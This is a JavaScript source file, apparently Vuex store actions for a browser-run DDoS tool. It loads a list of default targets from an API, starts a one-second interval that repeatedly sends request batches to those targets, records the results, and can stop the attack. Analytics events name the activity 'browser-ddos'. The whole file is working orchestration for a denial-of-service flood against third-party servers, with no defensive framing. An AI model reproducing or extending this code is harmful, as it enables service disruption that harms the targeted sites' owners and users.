import { getDefaultTargets } from 'src/modules/api'
import {
  initSendReqests,
  startAttackNotify,
} from 'src/modules/ddos/ddosAttack'
import { notifyError } from 'src/modules/notify'
import { analytics } from 'src/modules/analytics'

/**
 * Request default targets list
 */
export const setDefaultTargets = async ctx => {
  try {
    if (ctx.getters.getTargetsList.length > 0) return

    const respTargets = await getDefaultTargets()
    ctx.commit('setInitTargets', respTargets)
  } catch (error) {
    notifyError('Error requesting default targets')
    console.error(error)
  }
}

/**
 * Init browser attack ctx
 */
export const initBrowserAttack = ctx => {
  analytics.track('init-browser-ddos')

  const config = ctx.getters.getDdosConfig.user
  const targets = ctx.getters.getTargetsList
  const lastIntervalId =
    ctx.getters.getBrowserAttackIntervalId

  // Change attack status to active
  ctx.commit('setBrowserAttackStatus', true)

  // Last requested index in targets
  let lastIndex = 0

  // Create setInterval
  const reqInterval = setInterval(async () => {
    // Generate from/to for user param reqCount
    const from =
      lastIndex >= targets.length ? 0 : lastIndex + 1
    const to = from + config.reqCount
    lastIndex = to

    // Send requests array
    const respList = await initSendReqests(
      targets.slice(from, to),
    )

    // write reqs resultst to store
    ctx.commit('setResultsBrowserAttack', respList)
  }, 1000)

  // set setInterval id ti store
  ctx.commit('setBrowserAttackIntervalId', reqInterval)

  if (!lastIntervalId) {
    // TODO fix this (req startAttackNotify before header mounted)
    setTimeout(() => {
      startAttackNotify()
    }, 1000)
  }
}

/**
 * Destroy browser attack
 */
export const destroyBrowserAttack = ctx => {
  analytics.track('destroy-browser-ddos')
  const reqIntevalId =
    ctx.getters.getBrowserAttackIntervalId

  clearInterval(reqIntevalId)
  ctx.commit('setBrowserAttackIntervalId', null)
  ctx.commit('setBrowserAttackStatus', false)
}
